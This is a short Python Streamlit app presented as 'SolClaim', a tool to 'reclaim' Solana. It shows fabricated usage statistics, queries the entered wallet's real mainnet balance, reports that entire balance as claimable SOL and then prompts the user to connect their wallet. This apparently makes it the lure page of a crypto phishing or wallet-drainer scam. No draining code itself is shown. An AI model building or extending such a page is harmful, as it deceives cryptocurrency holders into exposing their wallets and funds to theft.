from solana.rpc.api import Client
from solana.publickey import PublicKey
import streamlit as st
import time
from decimal import Decimal

def initialize_session_state():
    if 'total_users' not in st.session_state:
        st.session_state.total_users = 6252
    if 'total_sol' not in st.session_state:
        st.session_state.total_sol = Decimal('1925.67')
    if 'referral_points' not in st.session_state:
        st.session_state.referral_points = {}
    if 'referrals' not in st.session_state:
        st.session_state.referrals = {}

def check_wallet_eligibility(wallet_address):
    solana_client = Client("https://api.mainnet-beta.solana.com")
    
    try:
        pubkey = PublicKey(wallet_address)

        # Use get_balance to properly check SOL balance
        response = solana_client.get_balance(pubkey)

        if "result" in response and "value" in response["result"]:
            balance = response["result"]["value"] / 1_000_000_000  # Convert lamports to SOL
            return round(balance, 4) if balance > 0 else 0  # Ensure only positive balances are returned

    except Exception as e:
        print(f"Debug - Wallet check error: {e}")

    return 0  # Return 0 if wallet is invalid or has no balance

def main():
    initialize_session_state()
    st.title("💰 SolClaim: Reclaim Your Sol!")
    st.markdown("📊 **Stats:** 6252 users have already claimed 1925.67 SOL in total!")

    menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])

    if menu == "Check Wallet ✅":
        wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")
        if wallet_address:
            with st.spinner("🕑 Loading wallet info..."):
                claimable_sol = check_wallet_eligibility(wallet_address)

            if claimable_sol > 0:
                st.success(f"🎉 You have {claimable_sol} SOL available to claim!")
                st.warning("⚠️ To proceed with the claim process, please connect your wallet.")
            else:
                st.error("❌ No SOL balance found. You cannot claim.")

if __name__ == "__main__":
    main()
